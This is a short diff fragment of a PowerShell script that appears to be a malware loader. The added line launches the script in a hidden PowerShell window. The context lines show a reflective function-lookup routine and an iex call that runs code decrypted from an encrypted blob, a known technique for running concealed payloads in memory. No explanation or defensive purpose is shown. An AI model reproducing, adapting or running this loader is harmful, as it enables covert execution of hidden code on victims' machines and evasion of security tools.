@@ -1,3 +1,4 @@
+start powershell -windowstyle h -args @"
 function LookupFunc {
     Param ($moduleName, $functionName)
     $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
@@ -65,4 +66,4 @@ sleep 2
 
 iex (New-Object System.Net.NetworkCredential("", (ConvertTo-SecureString -key $key $data))).Password
 
-
+"@
